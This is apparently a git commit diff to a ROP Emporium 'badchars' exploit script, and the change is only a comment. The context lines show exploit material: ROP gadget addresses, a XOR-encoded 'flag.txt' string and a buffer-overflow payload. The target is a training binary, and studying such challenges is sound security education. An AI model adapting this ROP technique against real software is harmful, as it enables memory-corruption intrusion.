1a6c18345fe40ec63b39702e4c333c53e7f4c3f5
spektre <84785848+SanjayVardhan@users.noreply.github.com>
2022-01-13 15:59:33 +0530

    Update badchars.py

--- Origin/Scripts/ROP/ROPemporium/badchars/badchars.py
+++ Origin/Scripts/ROP/ROPemporium/badchars/badchars.py
@@ -12,7 +12,7 @@ pop_r14_r15 = p64(0x00000000004006a0)  #pop r14 ; pop r15 ; ret
 print_file = p64(0x0000000000400510)
 xored_flag = p64(0x777b772d64626f65) #flag.txt xored with 3
 
-#fill the buffer and saved rbp. bruh to r12 and bss address to r13. then r12 to [r13] which stored the string in the bss address
+#fill the buffer and saved rbp. xored_flag to r12 and bss address to r13. then r12 to [r13] which stored the string in the bss address
 #we have to xor each bye of the string with 3 and store it in bss. the bss into rdi and call print_file boom.
 
 payload = b"A"*40 + r_pops + xored_flag + bss + p64(0) + p64(0) + r13_ptr
